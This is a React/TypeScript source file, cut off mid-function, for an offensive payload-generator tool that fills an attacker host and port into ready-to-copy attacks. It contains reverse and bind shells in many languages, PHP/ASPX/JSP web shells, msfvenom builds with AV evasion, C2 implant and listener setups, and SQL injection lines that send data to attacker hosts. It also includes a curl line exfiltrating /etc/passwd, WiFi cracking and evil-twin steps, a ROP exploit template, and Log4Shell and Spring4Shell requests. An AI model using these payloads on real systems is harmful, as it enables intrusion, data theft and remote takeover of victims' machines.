import { useState, useEffect, useCallback } from "react";
import { X, Copy, CheckCheck, Terminal, Shield, Zap, Code2, Send, RefreshCw, Lock, Globe, Cpu, ArrowRight, Database, Wifi, AlertTriangle, Hash, Package, Layers, Bug, DollarSign, Atom, Cloud } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { useToast } from "@/hooks/use-toast";

interface Props {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onInjectToChat?: (payload: string) => void;
}

type ShellType = "reverse" | "bind" | "web" | "msfvenom" | "c2" | "sqli" | "wifi" | "zeroday" | "payload" | "fileless" | "raas" | "hashcrack" | "quantum";
type OS = "linux" | "windows" | "macos" | "any";
type Encoding = "none" | "base64" | "urlenc" | "hex" | "ps_base64" | "unicode";

type Lang = {
  id: string; label: string; os: OS[]; types: ShellType[];
  color: string; icon: string;
};

const LANGUAGES: Lang[] = [
  // ── Core shells ──────────────────────────────────────────────────────────
  { id: "bash",      label: "Bash",            os: ["linux","macos"], types: ["reverse","bind"], color: "#10b981", icon: "SH" },
  { id: "sh",        label: "sh",              os: ["linux","macos"], types: ["reverse","bind"], color: "#10b981", icon: "🐚" },
  { id: "netcat",    label: "Netcat (nc)",      os: ["linux","macos","windows"], types: ["reverse","bind"], color: "#06b6d4", icon: "🕸️" },
  { id: "ncat",      label: "Ncat (nmap)",      os: ["linux","macos","windows"], types: ["reverse","bind"], color: "#06b6d4", icon: "🌐" },
  { id: "socat",     label: "Socat",            os: ["linux","macos"], types: ["reverse","bind"], color: "#8b5cf6", icon: "🔌" },
  { id: "python3",   label: "Python 3",         os: ["linux","macos","windows"], types: ["reverse","bind","web"], color: "#f59e0b", icon: "🐍" },
  { id: "python2",   label: "Python 2",         os: ["linux","macos","windows"], types: ["reverse","bind"], color: "#d97706", icon: "🐍" },
  { id: "powershell",label: "PowerShell",       os: ["windows"], types: ["reverse","bind"], color: "#3b82f6", icon: "💙" },
  { id: "cmd",       label: "CMD (batch)",      os: ["windows"], types: ["reverse","bind"], color: "#64748b", icon: "🪟" },
  { id: "php",       label: "PHP",              os: ["linux","windows","macos","any"], types: ["reverse","web"], color: "#a78bfa", icon: "🐘" },
  { id: "ruby",      label: "Ruby",             os: ["linux","macos","windows"], types: ["reverse"], color: "#ef4444", icon: "💎" },
  { id: "perl",      label: "Perl",             os: ["linux","macos","windows"], types: ["reverse"], color: "#e5e7eb", icon: "🦪" },
  { id: "java",      label: "Java",             os: ["linux","windows","macos"], types: ["reverse"], color: "#f97316", icon: "☕" },
  { id: "golang",    label: "Go",               os: ["linux","windows","macos"], types: ["reverse"], color: "#22d3ee", icon: "🐹" },
  { id: "rust",      label: "Rust",             os: ["linux","windows","macos"], types: ["reverse"], color: "#fb923c", icon: "🦀" },
  { id: "nodejs",    label: "Node.js",          os: ["linux","windows","macos"], types: ["reverse"], color: "#84cc16", icon: "🟢" },
  { id: "lua",       label: "Lua",              os: ["linux","macos"], types: ["reverse"], color: "#1d4ed8", icon: "🌙" },
  { id: "awk",       label: "AWK",              os: ["linux","macos"], types: ["reverse"], color: "#6d28d9", icon: "🔧" },
  { id: "telnet",    label: "Telnet",           os: ["linux","macos"], types: ["reverse"], color: "#64748b", icon: "📡" },
  { id: "rlwrap",    label: "Rlwrap + nc",      os: ["linux","macos"], types: ["reverse"], color: "#0ea5e9", icon: "🔗" },
  { id: "msfvenom",  label: "MSFvenom",         os: ["linux","windows","macos","any"], types: ["msfvenom"], color: "#dc2626", icon: "💥" },
  { id: "metasploit",label: "Metasploit (listener)", os: ["any"], types: ["c2"], color: "#dc2626", icon: "⚡" },
  { id: "sliver",    label: "Sliver C2",        os: ["any"], types: ["c2"], color: "#8b5cf6", icon: "🗡️" },
  { id: "covenant",  label: "Covenant C2",      os: ["windows"], types: ["c2"], color: "#3b82f6", icon: "🏰" },
  { id: "havoc",     label: "Havoc C2",         os: ["any"], types: ["c2"], color: "#ef4444", icon: "👹" },
  { id: "aspx",      label: "ASPX Web Shell",   os: ["windows"], types: ["web"], color: "#0ea5e9", icon: "WEB" },
  { id: "jsp",       label: "JSP Web Shell",    os: ["any"], types: ["web"], color: "#f59e0b", icon: "JSP" },
  // ── SQL Injection ─────────────────────────────────────────────────────────
  { id: "sqli-union",   label: "Union-Based",           os: ["any"], types: ["sqli"],      color: "#3b82f6", icon: "UNI" },
  { id: "sqli-blind",   label: "Blind / Time-Based",    os: ["any"], types: ["sqli"],      color: "#60a5fa", icon: "BLI" },
  { id: "sqli-oob",     label: "OOB / xp_cmdshell",     os: ["any"], types: ["sqli"],      color: "#93c5fd", icon: "OOB" },
  { id: "sqli-nosql",   label: "NoSQL Injection",        os: ["any"], types: ["sqli"],      color: "#1d4ed8", icon: "NSQ" },
  // ── WiFi Hacking ──────────────────────────────────────────────────────────
  { id: "wpa2",        label: "WPA2 Handshake",         os: ["linux"], types: ["wifi"],    color: "#22d3ee", icon: "WPA" },
  { id: "pmkid",       label: "PMKID Attack",           os: ["linux"], types: ["wifi"],    color: "#06b6d4", icon: "PMK" },
  { id: "evil-twin",   label: "Evil Twin / Rogue AP",   os: ["linux"], types: ["wifi"],    color: "#0891b2", icon: "EVL" },
  { id: "wps",         label: "WPS Pixie Dust",         os: ["linux"], types: ["wifi"],    color: "#0e7490", icon: "WPS" },
  // ── Zero-Day ──────────────────────────────────────────────────────────────
  { id: "zd-hunting",  label: "Fuzzing & Hunting",      os: ["any"], types: ["zeroday"],   color: "#f97316", icon: "FUZ" },
  { id: "zd-exploit",  label: "Exploit Dev Template",   os: ["any"], types: ["zeroday"],   color: "#fb923c", icon: "EXP" },
  { id: "zd-cve",      label: "CVE Templates 2024",     os: ["any"], types: ["zeroday"],   color: "#fdba74", icon: "CVE" },
  // ── Payload Library ───────────────────────────────────────────────────────
  { id: "pl-windows",  label: "Windows Payloads",       os: ["any"], types: ["payload"],   color: "#a78bfa", icon: "WIN" },
  { id: "pl-linux",    label: "Linux Payloads",         os: ["any"], types: ["payload"],   color: "#8b5cf6", icon: "LNX" },
  { id: "pl-macro",    label: "Office Macro / HTA",     os: ["any"], types: ["payload"],   color: "#7c3aed", icon: "MAC" },
  // ── Fileless Malware ──────────────────────────────────────────────────────
  { id: "fl-powershell", label: "PowerShell In-Memory", os: ["any"], types: ["fileless"],  color: "#ec4899", icon: "PS1" },
  { id: "fl-wmi",      label: "WMI Persistence",        os: ["any"], types: ["fileless"],  color: "#db2777", icon: "WMI" },
  { id: "fl-registry", label: "Registry / LOLBins",     os: ["any"], types: ["fileless"],  color: "#be185d", icon: "REG" },
  // ── RaaS Architecture ─────────────────────────────────────────────────────
  { id: "raas-encrypt", label: "Encryption Module",     os: ["any"], types: ["raas"],      color: "#dc2626", icon: "ENC" },
  { id: "raas-c2",     label: "C2 Infrastructure",      os: ["any"], types: ["raas"],      color: "#b91c1c", icon: "C2" },
  { id: "raas-evasion", label: "Evasion & Anti-VM",     os: ["any"], types: ["raas"],      color: "#991b1b", icon: "EVA" },
  // ── Hash Cracker ──────────────────────────────────────────────────────────
  { id: "hc-hashcat",  label: "Hashcat (GPU)",          os: ["any"], types: ["hashcrack"], color: "#fbbf24", icon: "HC" },
  { id: "hc-john",     label: "John the Ripper",        os: ["any"], types: ["hashcrack"], color: "#f59e0b", icon: "JTR" },
  { id: "hc-rainbow",  label: "Rainbow Tables",         os: ["any"], types: ["hashcrack"], color: "#d97706", icon: "RBW" },
  // ── Quantum Attacks ───────────────────────────────────────────────────────
  { id: "qa-shor",     label: "Shor's Algorithm",       os: ["any"], types: ["quantum"],   color: "#818cf8", icon: "SHR" },
  { id: "qa-grover",   label: "Grover's Algorithm",     os: ["any"], types: ["quantum"],   color: "#6366f1", icon: "GRV" },
  { id: "qa-harvest",  label: "Harvest Now, Decrypt Later", os: ["any"], types: ["quantum"], color: "#4f46e5", icon: "HND" },
];

const C2_FRAMEWORKS = [
  { id: "metasploit", label: "Metasploit", color: "#dc2626" },
  { id: "sliver",     label: "Sliver",     color: "#8b5cf6" },
  { id: "covenant",   label: "Covenant",   color: "#3b82f6" },
  { id: "havoc",      label: "Havoc",      color: "#ef4444" },
  { id: "empire",     label: "Empire",     color: "#f59e0b" },
  { id: "brute",      label: "Brute Ratel",color: "#10b981" },
];

function buildShell(lang: string, type: ShellType, lhost: string, lport: string, encoding: Encoding): string {
  const h = lhost || "10.10.14.1";
  const p = lport || "4444";

  const raw = (() => {
    // ── REVERSE SHELLS ───────────────────────────────────────────────────────
    if (type === "reverse") {
      if (lang === "bash") return `bash -i >& /dev/tcp/${h}/${p} 0>&1`;
      if (lang === "sh") return `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`;
      if (lang === "netcat") return `nc -e /bin/sh ${h} ${p}`;
      if (lang === "ncat") return `ncat ${h} ${p} -e /bin/sh`;
      if (lang === "socat") return `socat TCP:${h}:${p} EXEC:/bin/sh`;
      if (lang === "python3") return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      if (lang === "python2") return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      if (lang === "powershell") return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      if (lang === "cmd") return `cmd.exe /c "nc ${h} ${p} -e cmd.exe"`;
      if (lang === "php") return `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      if (lang === "ruby") return `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
      if (lang === "perl") return `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
      if (lang === "java") return `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`;
      if (lang === "golang") return `package main\nimport("net";"os/exec";"syscall")\nfunc main(){\nc,_:=net.Dial("tcp","${h}:${p}")\ncmd:=exec.Command("/bin/sh")\ncmd.Stdin=c\ncmd.Stdout=c\ncmd.Stderr=c\ncmd.SysProcAttr=&syscall.SysProcAttr{}\ncmd.Run()}`;
      if (lang === "nodejs") return `(function(){\nvar net = require("net"),\ncp = require("child_process"),\nsh = cp.spawn("/bin/sh", []);\nvar client = new net.Socket();\nclient.connect(${p}, "${h}", function(){\nclient.pipe(sh.stdin);\nsh.stdout.pipe(client);\nsh.stderr.pipe(client);\n});\nreturn /a/;\n})();`;
      if (lang === "lua") return `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`;
      if (lang === "awk") return `awk 'BEGIN {s = "/inet/tcp/0/${h}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
      if (lang === "telnet") return `TF=$(mktemp -u); mkfifo $TF && telnet ${h} ${p} 0<$TF | /bin/sh 1>$TF`;
      if (lang === "rlwrap") return `# Listener (attacker):\nrlwrap nc -lvnp ${p}\n\n# Target:\nbash -i >& /dev/tcp/${h}/${p} 0>&1`;
      if (lang === "rust") return `use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\nfn main() {\n  let s = TcpStream::connect("${h}:${p}").unwrap();\n  let fd = s.as_raw_fd();\n  Command::new("/bin/sh")\n    .stdin(unsafe { Stdio::from_raw_fd(fd) })\n    .stdout(unsafe { Stdio::from_raw_fd(fd) })\n    .stderr(unsafe { Stdio::from_raw_fd(fd) })\n    .spawn().unwrap().wait().unwrap();\n}`;
    }
    // ── BIND SHELLS ──────────────────────────────────────────────────────────
    if (type === "bind") {
      if (lang === "bash") return `# On target:\nbash -i >& /dev/tcp/0.0.0.0/${p} 0>&1 &\n\n# On attacker:\nnc ${h} ${p}`;
      if (lang === "netcat") return `# Target:\nnc -lvp ${p} -e /bin/sh\n\n# Attacker:\nnc ${h} ${p}`;
      if (lang === "ncat") return `# Target:\nncat -lvp ${p} -e /bin/sh\n\n# Attacker:\nncat ${h} ${p}`;
      if (lang === "socat") return `# Target:\nsocat TCP-LISTEN:${p},reuseaddr EXEC:/bin/sh\n\n# Attacker:\nsocat - TCP:${h}:${p}`;
      if (lang === "python3") return `python3 -c 'import socket,subprocess;s=socket.socket();s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();import os;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      if (lang === "powershell") return `powershell -c "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$rb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($rb,0,$rb.Length);$s.Flush()}"`;
      if (lang === "php") return `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${p});socket_listen($s,1);$c=socket_accept($s);while($l=socket_read($c,1024)){exec($l." 2>&1",$out);$out=implode("\\n",$out);socket_write($c,$out);}'`;
    }
    // ── WEB SHELLS ───────────────────────────────────────────────────────────
    if (type === "web") {
      if (lang === "php") return `<?php\n// Simple PHP Web Shell\nif(isset($_REQUEST['cmd'])){\n  $cmd = $_REQUEST['cmd'];\n  echo "<pre>";\n  system($cmd);\n  echo "</pre>";\n}\n?>\n<form method="POST">\n<input type="text" name="cmd" placeholder="command" size="60">\n<input type="submit" value="Execute">\n</form>`;
      if (lang === "aspx") return `<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% \n  string cmd = Request["cmd"];\n  if(cmd != null) {\n    Process p = new Process();\n    p.StartInfo.FileName = "cmd.exe";\n    p.StartInfo.Arguments = "/c " + cmd;\n    p.StartInfo.UseShellExecute = false;\n    p.StartInfo.RedirectStandardOutput = true;\n    p.Start();\n    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");\n  }\n%>\n<form><input name="cmd" size="60"><input type="submit"></form>`;
      if (lang === "jsp") return `<% \nimport java.io.*;\nString cmd = request.getParameter("cmd");\nif(cmd != null){\n  Runtime r = Runtime.getRuntime();\n  Process p = r.exec(new String[]{"sh","-c",cmd});\n  InputStream i = p.getInputStream();\n  out.println("<pre>");\n  int c;\n  while((c=i.read())!=-1) out.print((char)c);\n  out.println("</pre>");\n}\n%>\n<form><input name="cmd" size="60"><input type="submit"></form>`;
      if (lang === "python3") return `from http.server import BaseHTTPRequestHandler, HTTPServer\nimport subprocess, urllib.parse\n\nclass Handler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    cmd = urllib.parse.unquote(self.path[1:])\n    if cmd:\n      out = subprocess.getoutput(cmd)\n    else:\n      out = "Usage: /?cmd=<command>"\n    self.send_response(200)\n    self.end_headers()\n    self.wfile.write(out.encode())\n\nHTTPServer(("0.0.0.0", ${p}), Handler).serve_forever()`;
    }
    // ── MSFVENOM ─────────────────────────────────────────────────────────────
    if (type === "msfvenom") {
      if (lang === "msfvenom") return `# Linux ELF reverse shell\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f elf -o rev.elf\nchmod +x rev.elf && ./rev.elf\n\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f exe -o rev.exe\n\n# Windows DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f dll -o rev.dll\n\n# PowerShell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f ps1 -o rev.ps1\n\n# Python\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f raw -o rev.py\n\n# PHP\nmsfvenom -p php/reverse_php LHOST=${h} LPORT=${p} -f raw -o rev.php\n\n# Android APK\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -o rev.apk\n\n# Java WAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=${h} LPORT=${p} -f war -o rev.war\n\n# Staged Meterpreter (best AV evasion)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=${h} LPORT=443 -e x64/xor_dynamic -i 10 -f exe -o meterp.exe`;
    }
    // ── C2 TEMPLATES ─────────────────────────────────────────────────────────
    if (type === "c2") {
      if (lang === "metasploit") return `# Metasploit multi/handler listener\nmsfconsole -q -x "\nuse exploit/multi/handler;\nset PAYLOAD windows/x64/meterpreter/reverse_tcp;\nset LHOST ${h};\nset LPORT ${p};\nset ExitOnSession false;\nexploit -j -z;\n"\n\n# HTTPS listener (stealth)\nmsfconsole -q -x "\nuse exploit/multi/handler;\nset PAYLOAD windows/x64/meterpreter/reverse_https;\nset LHOST ${h};\nset LPORT 443;\nset STAGINGKEY $(openssl rand -hex 16);\nexploit -j;\n"`;
      if (lang === "sliver") return `# Sliver C2 implant generation\n# Start Sliver server:\nsliver-server\n\n# In Sliver console:\ngenerate --mtls ${h}:${p} --os windows --arch amd64 --save /tmp/implant.exe\n\n# Start MTLS listener:\nmtls --lport ${p}\n\n# Generate beacon (persistent check-in):\ngenerate beacon --mtls ${h}:${p} --seconds 30 --jitter 15 --os windows --save /tmp/beacon.exe`;
      if (lang === "covenant") return `# Covenant C2 Setup\n# 1. Start Covenant:\ndocker run -it -p 7443:7443 -p 80:80 -p 443:443 ghcr.io/cobbr/covenant\n\n# 2. Access UI at https://localhost:7443\n# 3. Create Listener:\n#    - Type: HTTP\n#    - ConnectAddresses: ${h}\n#    - BindPort: ${p}\n\n# 4. Generate Grunt (implant):\n#    Launchers > PowerShell\n#    Copy command and execute on target`;
      if (lang === "havoc") return `# Havoc C2 teamserver.yaml\nTeamServer:\n  Host: ${h}\n  Port: ${p}\n  Build:\n    Compiler64: /usr/bin/x86_64-w64-mingw32-gcc\n\nListeners:\n  - Name: "${h}"\n    Protocol: "https"\n    Hosts:\n      - "${h}"\n    HostBind: "0.0.0.0"\n    PortBind: 443\n    PortConn: 443\n\n# Start: ./havoc server --profile teamserver.yaml`;
      if (lang === "empire") return `# PowerShell Empire\n# Start Empire:\npython3 empire --rest --username admin --password password\n\n# Create HTTP listener:\nlisteners\nuselistener http\nset Host http://${h}:${p}\nexecute\n\n# Generate stager:\nusestager windows/launcher_bat\nset Listener http_listener\nexecute`;
      if (lang === "brute") return `# Brute Ratel C4\n# Config JSON template:\n{\n  "name": "BRC4_implant",\n  "type": "http",\n  "host": "${h}",\n  "port": ${p},\n  "callback_interval": 30,\n  "jitter": 20,\n  "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",\n  "headers": {\n    "Accept": "*/*",\n    "Content-Type": "application/octet-stream"\n  },\n  "sleep_mask": true,\n  "syscall": "indirect"\n}`;
    }
    // ── SQL INJECTION ─────────────────────────────────────────────────────────
    if (type === "sqli") {
      if (lang === "sqli-union") return `-- Union-based SQLi detection\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n\n-- Find number of columns:\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n\n-- Extract database version (MySQL):\n' UNION SELECT version(),NULL,NULL--\n\n-- Extract tables:\n' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--\n\n-- Extract columns:\n' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--\n\n-- Dump credentials:\n' UNION SELECT username,password,NULL FROM users--`;
      if (lang === "sqli-blind") return `-- Boolean-based blind SQLi\n' AND 1=1--   (true → page normal)\n' AND 1=2--   (false → page changes)\n\n-- Enumerate database name char by char:\n' AND SUBSTRING(database(),1,1)='a'--\n' AND ASCII(SUBSTRING(database(),1,1))>97--\n\n-- Time-based blind (MySQL):\n' AND SLEEP(5)--\n'; SELECT SLEEP(5)--\n1'; IF(1=1, SLEEP(5), 0)--\n\n-- Time-based (MSSQL):\n'; WAITFOR DELAY '0:0:5'--\n\n-- Time-based (PostgreSQL):\n'; SELECT pg_sleep(5)--\n\n-- sqlmap automation:\nsqlmap -u "http://target.com/page?id=1" --dbs --batch\nsqlmap -u "http://target.com/page?id=1" -D dbname --tables\nsqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`;
      if (lang === "sqli-oob") return `-- Out-of-band SQLi (DNS exfiltration — MySQL)\n' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\x'))--\n\n-- MySQL into outfile:\n' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--\n\n-- MSSQL xp_cmdshell:\n'; EXEC xp_cmdshell 'whoami'--\n'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(http://${h}:${p}/shell.ps1)"'--\n\n-- PostgreSQL COPY:\n'; COPY (SELECT 'x') TO PROGRAM 'curl http://${h}:${p}/?q=$(cat /etc/passwd|base64)'--\n\n-- SQLi WAF bypass:\n'/**/UNION/**/SELECT/**/1,2,3--\n'%09UNION%09SELECT%091,2,3--\n' /*!UNION*/ /*!SELECT*/ 1,2,3--`;
      if (lang === "sqli-nosql") return `-- NoSQL Injection (MongoDB)\n// Login bypass:\n{"username": {"$ne": null}, "password": {"$ne": null}}\n\n// URL parameter bypass:\nusername[$ne]=admin&password[$ne]=admin\n\n// JavaScript injection:\nusername=admin'%3Breturn%20true%3Bvar%20x%3D'\n\n// Extract data via regex:\n{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}\n{"username": {"$regex": "^ad"}, "password": {"$ne": "x"}}\n\n// nosqli tool:\nnoscli -u http://target.com/login -d 'user=INJECT&pass=INJECT' --attack auth`;
      return `-- SQLi payload for ${lang}:\n' OR '1'='1\n' OR '1'='1'--\n' OR '1'='1'/*\n') OR ('1'='1\n\n-- Auth bypass:\nadmin'--\nadmin'/*\n' OR 1=1--\n' OR 'x'='x\n\n-- Error-based (MySQL):\n' AND extractvalue(1,concat(0x7e,database()))--\n' AND updatexml(1,concat(0x7e,version()),1)--`;
    }
    // ── WIFI HACKING ─────────────────────────────────────────────────────────
    if (type === "wifi") {
      if (lang === "wpa2") return `# WPA2 Handshake Capture & Crack\n\n# 1. Enable monitor mode:\nairmon-ng start wlan0\n\n# 2. Scan networks:\nairodump-ng wlan0mon\n\n# 3. Capture handshake (target BSSID + channel):\nairodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon\n\n# 4. Deauth client to force handshake:\naireplay-ng -0 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon\n\n# 5. Crack with hashcat (mode 22000):\nhashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt\n\n# 6. Alternative — aircrack-ng:\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture*.cap\n\n# Convert .cap to hashcat format:\nhcxtools hcxpcapngtool -o capture.hc22000 capture.cap`;
      if (lang === "pmkid") return `# PMKID Attack (No client deauth needed)\n\n# Install hcxdumptool:\napt install hcxdumptool hcxtools\n\n# Capture PMKID:\nhcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1\n\n# Convert to hashcat format:\nhcxpcapngtool -o hash.hc22000 -E wordlist capture.pcapng\n\n# Crack with hashcat:\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule\n\n# Rule-based attack:\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule\n\n# Combinator attack:\nhashcat -m 22000 hash.hc22000 -a 1 wordlist1.txt wordlist2.txt`;
      if (lang === "evil-twin") return `# Evil Twin / Rogue AP Attack\n\n# Using hostapd-wpe:\napt install hostapd-wpe\n\n# hostapd.conf:\ninterface=wlan0\ndriver=nl80211\nssid=<TARGET_SSID>\nhw_mode=g\nchannel=6\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\nwpa_passphrase=password123\n\nhostapd -d hostapd.conf\n\n# Using airbase-ng:\nairbase-ng -e <TARGET_SSID> -c <CHANNEL> wlan0mon\n\n# Combined with DHCP + internet sharing:\ndhcpd -cf /etc/dhcp/dhcpd.conf at0\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n\n# Capture credentials with Bettercap:\nbettercap -iface at0\n# bettercap> net.probe on\n# bettercap> http.proxy on\n# bettercap> https.proxy on`;
      if (lang === "wps") return `# WPS Attack (Pixie Dust + Bruteforce)\n\n# Scan for WPS networks:\nwash -i wlan0mon\n\n# Pixie Dust attack (fastest — recovers PIN instantly on vulnerable APs):\nreaver -i wlan0mon -b <BSSID> -K 1 -vvv\n\n# Standard WPS PIN bruteforce:\nreaver -i wlan0mon -b <BSSID> -vvv -d 3 -t 5\n\n# Bully (alternative to reaver):\nbully -b <BSSID> -c <CHANNEL> wlan0mon\n\n# OneShot (optimized pixie dust):\npython3 oneshot.py -i wlan0mon -b <BSSID> -K\n\n# WPS PIN generation algorithms:\npwgen --dlink <BSSID>    # D-Link\npwgen --belkin <BSSID>   # Belkin`;
      return `# WiFi attack for ${lang}:\n\n# Enable monitor mode:\nairmon-ng check kill\nairmon-ng start wlan0\n\n# Scan networks:\nairodump-ng wlan0mon\n\n# Deauth attack:\naireplay-ng -0 0 -a <BSSID> wlan0mon\n\n# Capture handshake:\nairodump-ng -c <CH> --bssid <BSSID> -w cap wlan0mon\n\n# Crack:\naircrack-ng -w /usr/share/wordlists/rockyou.txt cap*.cap`;
    }
    // ── ZERO-DAY EXPLOITS ────────────────────────────────────────────────────
    if (type === "zeroday") {
      if (lang === "zd-hunting") return `# Zero-Day Hunting Methodology\n\n# 1. Fuzzing with AFL++:\nafl-fuzz -i inputs -o findings -x dict/http.dict -- ./target @@\n\n# 2. Coverage-guided fuzzing:\nafl-cov -d findings --coverage-cmd "cat @@ | ./target" --code-dir ./src\n\n# 3. libFuzzer:\nclang -g -fsanitize=fuzzer,address target.c -o fuzz\n./fuzz -max_len=1024 corpus/\n\n# 4. Memory error detection:\nclang -fsanitize=address,undefined ./target.c -o target_asan\nASAN_OPTIONS=detect_leaks=1 ./target_asan input.bin\n\n# 5. Static analysis:\ncodeql database create mydb --language=cpp --command="make"\ncodeql query run queries/cpp/ql/src/Security/ --database mydb\n\n# 6. Taint analysis with Joern:\njoern --script scripts/taint_analysis.sc --param inputFile=target.jar\n\n# 7. Binary diffing (patch analysis):\nbindiff old_binary new_binary\ndiaphora old.idb new.idb`;
      if (lang === "zd-exploit") return `# Zero-Day Exploit Development Template\n\n# Stage 1: Trigger crash\npython3 -c "print('A'*1024)" | ./target  # Basic overflow\n\n# Stage 2: Find EIP/RIP offset\nmsf-pattern_create -l 1024 > pattern.txt\nmsf-pattern_offset -l 1024 -q <CRASH_VALUE>\n\n# Stage 3: Check protections\nchecksec --file=./target\npwndbg> vmmap\n\n# Stage 4: Find gadgets for ROP chain\nROPgadget --binary ./target --rop\nropper --file ./target --search "pop rdi"\n\n# Stage 5: Exploit template (Python + pwntools):\nfrom pwn import *\n\ne = ELF('./target')\np = process('./target')  # or remote('${h}', ${p})\n\noffset = 72\nrop = ROP(e)\nrop.call(e.plt['system'], [next(e.search(b'/bin/sh'))])\n\npayload = b'A' * offset + rop.chain()\np.sendline(payload)\np.interactive()`;
      if (lang === "zd-cve") return `# Recent Critical CVE Research Templates\n\n# CVE-2024 — HTTP/2 Continuation Flood:\npython3 -c "\nimport socket, ssl\ns = socket.create_connection(('${h}', ${p}))\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\nss = ctx.wrap_socket(s)\n# Send malformed CONTINUATION frames...\n"\n\n# Log4Shell (CVE-2021-44228) — still active on unpatched systems:\ncurl -H 'X-Api-Version: \${jndi:ldap://${h}:${p}/a}' http://TARGET/\n\n# Spring4Shell (CVE-2022-22965):\ncurl -X POST 'http://TARGET/app' \\\n  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...%7D'\n\n# Citrix Bleed (CVE-2023-4966) — session token leak:\ncurl -s --path-as-is -H 'Host: TARGET' 'https://TARGET/oauth/idp/.well-known/openid-configuration' -o /tmp/req.bin && xxd /tmp/req.bin | grep -a 'NSC_'`;
